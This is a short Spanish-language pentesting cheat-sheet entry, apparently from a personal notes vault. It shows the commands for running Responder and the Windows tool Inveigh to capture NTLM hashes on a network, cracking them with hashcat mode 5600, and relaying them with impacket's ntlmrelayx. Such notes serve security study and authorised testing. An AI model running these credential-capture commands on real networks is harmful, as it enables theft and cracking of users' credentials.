Uso común:
```
responder -I [Interfaz de red]
```

Con esto podremos capturar hashes, los cuales podremos romper con hashcat y la flag `-m 5600`

Otra opción para capturar hashes seria forzarlo un poco con [[Ntlmrelayx]] de impacket.


La version de windows es Inveigh:
```
.\Inveigh.exe
```
O 
```
Import-Module .\Inveigh.ps1

Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

